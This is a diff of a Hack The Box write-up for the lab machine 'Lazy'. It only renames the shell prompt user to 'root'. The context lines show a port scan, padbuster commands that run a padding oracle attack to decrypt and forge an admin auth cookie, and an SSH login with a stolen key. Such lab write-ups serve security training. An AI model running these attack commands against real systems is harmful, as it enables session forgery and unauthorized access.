@@ -12,7 +12,7 @@ tags: [path_highjacking, oracle_padding_attack, crypto] # add tag
 ### Enumration
 
 ```bash
-argenestel@parrot  ~/Desktop/hackthebox/lazy  rustscan  10.10.10.18
+root@parrot  ~/Desktop/hackthebox/lazy  rustscan  10.10.10.18
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
 | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
 | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
@@ -120,7 +120,7 @@ so we found out about oracle padding attack
 using padbuster to get the auth cookie
 
 ```bash
-✘ argenestel@parrot  ~/Desktop/hackthebox/lazy  padbuster http://10.10.10.18/login.php 1hcGpO3BllzMF4pB9EoWPek8Ar%2FcCi19 8 --cookie auth=1hcGpO3BllzMF4pB9EoWPek8Ar%2FcCi19 --encoding 0
+✘ root@parrot  ~/Desktop/hackthebox/lazy  padbuster http://10.10.10.18/login.php 1hcGpO3BllzMF4pB9EoWPek8Ar%2FcCi19 8 --cookie auth=1hcGpO3BllzMF4pB9EoWPek8Ar%2FcCi19 --encoding 0
 
 +-------------------------------------------+
 | PadBuster - v0.3.3                        |
@@ -175,7 +175,7 @@ Use of uninitialized value $plainTextBytes in concatenation (.) or string at /us
 ```
 
 ```bash
-✘ argenestel@parrot  ~/Desktop/hackthebox/lazy  padbuster http://10.10.10.18/login.php 1hcGpO3BllzMF4pB9EoWPek8Ar%2FcCi19 8 --cookie auth=1hcGpO3BllzMF4pB9EoWPek8Ar%2FcCi19 --encoding 0 -plaintext user=admin
+✘ root@parrot  ~/Desktop/hackthebox/lazy  padbuster http://10.10.10.18/login.php 1hcGpO3BllzMF4pB9EoWPek8Ar%2FcCi19 8 --cookie auth=1hcGpO3BllzMF4pB9EoWPek8Ar%2FcCi19 --encoding 0 -plaintext user=admin
 
 +-------------------------------------------+
 | PadBuster - v0.3.3                        |
@@ -249,7 +249,7 @@ so using this token we login as admin and grab sshkey of user.
 ### PrivEsc
 
 ```bash
-✘ argenestel@parrot  ~/Desktop/hackthebox/lazy  ssh -i mysshkeywithnamemitsos mitsos@10.10.10.18
+✘ root@parrot  ~/Desktop/hackthebox/lazy  ssh -i mysshkeywithnamemitsos mitsos@10.10.10.18
 load pubkey "mysshkeywithnamemitsos": invalid format
 The authenticity of host '10.10.10.18 (10.10.10.18)' can't be established.
 ECDSA key fingerprint is SHA256:OJ5DTyZUGZXEpX4BKFNTApa88gR/+w5vcNathKIPcWE.
